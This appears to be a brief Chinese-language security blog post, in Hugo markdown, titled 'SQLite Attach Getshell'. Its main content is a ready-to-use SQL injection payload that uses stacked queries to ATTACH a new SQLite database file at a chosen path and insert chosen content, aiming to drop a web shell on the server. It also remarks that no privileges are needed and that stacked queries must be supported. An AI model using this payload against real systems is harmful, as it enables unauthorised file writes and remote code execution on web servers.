---
title: "SQLite Attach Getshell"
date: 2019-02-04T00:00:00+08:00
draft: false
tags: ['sqlite','sqli']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

SQLite Attach Getshell

<!--more-->

无权限要求.

```
;ATTACH DATABASE '路径' AS pwn ; CREATE TABLE pwn.exp (dataz text) ; INSERT INTO pwn.exp (dataz) VALUES ('内容'); --
```

需支持堆查询.